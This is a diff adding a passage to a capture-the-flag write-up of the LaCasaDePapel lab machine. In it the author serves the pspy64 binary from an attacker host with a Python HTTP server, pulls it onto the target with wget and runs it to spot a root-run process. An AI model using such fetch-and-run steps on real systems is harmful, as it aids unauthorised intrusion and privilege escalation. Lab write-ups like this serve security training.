@@ -251,3 +251,18 @@ Now my first thought was to SSH in as the user <b>berlin</b> since that is where
 
 lacasadepapel [~]$
 ```
+Doing some basic enumeration, all I found were a couple files in the <b>professor</b> home directory but could really make much of it. My next thought was to see what processes were running in the background and to do this I would use a tool called <b>pspy</b>. I needed to get the <b>pspy</b> executable onto the box so I decided to use a <b>python SimpleHTTPServer</b>
+```
+# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+Then I used <b>wget</b> from the professor account to copy it to his home directory.
+```
+# wget 10.10.14.21/pspy64
+Connecting to 10.10.14.21 (10.10.14.21:80)
+pspy64               100% |************************************************| 4364k  0:00:00 ETA
+```
+Make the file executable and then run it. After some time has passed you should see an interesting process running.
+```
+2019/09/18 19:06:02 CMD: UID=0    PID=5962   | sudo -u nobody /usr/bin/node /home/professor/memcached.js
+```
